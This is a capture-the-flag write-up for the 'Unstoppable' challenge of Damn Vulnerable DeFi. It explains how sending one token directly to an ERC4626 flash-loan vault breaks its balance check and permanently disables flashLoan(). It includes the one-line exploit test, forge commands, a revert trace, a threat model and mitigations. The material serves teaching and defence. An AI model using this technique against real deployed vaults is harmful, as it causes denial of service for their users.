
Damn Vulnerable DeFi 

# 1 – Unstoppable Challenge

## Challenge Objective

This challenge involves an ERC4626-based tokenized vault offering flash loans. The vault assumes that the number of tokens it holds (`totalAssets`) will always match the number of shares it has issued (`totalSupply`), maintaining a strict 1:1 ratio.

The attacker's goal is to break this invariant and render the `flashLoan()` functionality permanently unusable.

## Vulnerability Explanation

Within the `flashLoan()` function, the vault performs the following check:

```solidity
if (convertToShares(totalSupply) != totalAssets()) revert InvalidBalance();
````

This logic assumes that the token balance of the vault (i.e., `totalAssets`) always matches the amount of shares issued (`totalSupply`). However, because this vault uses a standard ERC20 token, an attacker can bypass the `deposit()` function and send tokens directly to the vault using `transfer()`.

This action increases the result of `totalAssets()` without affecting `totalSupply`, breaking the equality and causing `flashLoan()` to revert.

This creates a **logic-based denial-of-service condition**, rendering the flash loan feature unusable.

## Exploit Code

```solidity
function test_unstoppable() public checkSolvedByPlayer {


    // Injecting extra tokens to the vault directly
    token.transfer(address(vault), 1);

}
```

## Success Conditions

If the exploit is successful:

* The `flashLoan()` function reverts due to an `InvalidBalance()` check failure.
* The monitor contract detects this failure,
* It pauses the vault and transfers ownership back to the deployer.

```solidity
assertTrue(vault.paused());
assertEq(vault.owner(), deployer);
```

## How to Run

```bash
forge test -t test_unstoppable
```

To see log output during test execution: (I added some log on test_unstoppable function)

```bash
forge test -t test_unstoppable -vvvv
```

## Evidence (Log Output)

Example log trace confirming the revert:

```
← [Revert] InvalidBalance()
emit FlashLoanStatus(success: false)
UnstoppableVault::flashLoan(...) → reverted
```

This log confirms that the vault’s internal invariant was broken and the `flashLoan()` operation is now blocked.

## Threat Modeling (Focused)

**Security Goal:**
The vault should maintain consistent internal accounting and continue offering flash loans.

**Threat Actor:**
An external user (`player`) with the ability to transfer tokens directly to the vault.

**Attack Vector:**
The attacker uses the ERC20 `transfer()` function to send tokens directly to the vault, bypassing internal accounting.

**Impact:**

* Causes desynchronization between `totalAssets()` and `convertToShares(totalSupply)`
* Triggers `InvalidBalance()` and breaks `flashLoan()` permanently
* Denial of service for any future flash loan functionality

**Risk Level:**
High — system becomes non-functional with a single low-cost transaction.

## Mitigation

This vulnerability stems from the assumption that all tokens in the vault must be deposited via the `deposit()` function, which is not enforced due to ERC20 flexibility.

To mitigate:

* Track internal asset balance separately instead of relying on `balanceOf(this)`.
* Use vault-specific wrappers or logic to reject unsolicited ERC20 transfers.
* Add invariant checks that account for token injection.

## Security Best Practices

* Never rely solely on `balanceOf(address(this))` for critical logic in smart contracts.
* Ensure all token inflows happen through controlled and auditable entry points.
* Use internal accounting for core invariants.
* Consider using ERC777 or ERC4626+ extensions to better control token flow.
* Implement circuit breakers and logging for abnormal state changes.
